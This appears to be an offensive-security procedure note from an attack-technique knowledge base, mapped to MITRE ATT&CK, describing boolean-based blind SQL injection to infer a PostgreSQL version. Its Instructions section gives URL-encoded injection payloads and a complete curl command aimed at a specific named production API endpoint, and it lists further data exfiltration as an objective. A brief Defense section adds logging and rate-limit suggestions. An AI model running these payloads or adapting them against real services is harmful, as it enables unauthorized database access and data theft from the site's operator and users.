---
tags:
  - blind-sqli
  - data-exfiltration
  - web
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-blind-sqli-true-condition]]'
platforms:
  - Web
  - PostgreSQL
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 0a581d36-04e6-4c20-897b-913443f04d2b
created_at: '2025-12-14T03:15:10.044Z'
updated_at: '2025-12-14T03:15:10.044Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Extract-Database-Information-via-Blind-SQLi

## Summary

This procedure uses boolean-based blind SQL injection to infer database details, such as the PostgreSQL version, by crafting conditional payloads and observing response differences.

## Description

Building on confirmed injection, payloads like 'AND (SELECT substring(version(),1,1)='P')' are injected into the URL path. True responses indicate matching characters, allowing bit-by-bit extraction in the web API context.

## Requirements

1. Confirmed true/false injection points
2. Curl or similar for repeated requests
3. Patience for iterative testing (e.g., 100+ requests for version string)

## Defense

Defensive measures and detection strategies:

- Enable query logging in PostgreSQL to detect injection patterns
- Use intrusion detection systems (IDS) for SQL keywords in traffic
- Implement CAPTCHA or rate limits on API calls

## Objectives

1. Infer database version and type
2. Enable further data exfiltration
3. Assess potential for sensitive data access

## Instructions

### Step 1: Craft Conditional Payloads

**Context**: Design boolean conditions for substring matching.

**Instructions**: For version extraction, test 'AND (SELECT version() LIKE 'PostgreSQL%')' encoded in URL.

> Modify the path: /number_trips/1/'999%20AND%20(SELECT%20version()%20LIKE%20%27PostgreSQL%%27)--'

### Step 2: Iterate and Infer

**Context**: Send requests and compare responses.

**Command** ([[commands/curl-blind-sqli-true-condition]]):
Adapt the curl command with new payload, e.g., replace the URL with version test.
```bash
curl -i -s -k -X GET -H 'Host: id.indrive.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Origin: https://promo.indrive.com' -H 'Referer: https://promo.indrive.com/' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-site' -H 'Te: trailers' -H 'Connection: close' 'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20AND%20(SELECT%20version()%20LIKE%20%27PostgreSQL%%27)--'
```

> Non-empty for true; build string like "PostgreSQL 14.8 on Ubuntu".

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-blind-sqli-true-condition]]

## Tools Used

- [[tools/curl]]

## Tags

- [[data-exfiltration]]
- [[blind-sqli]]
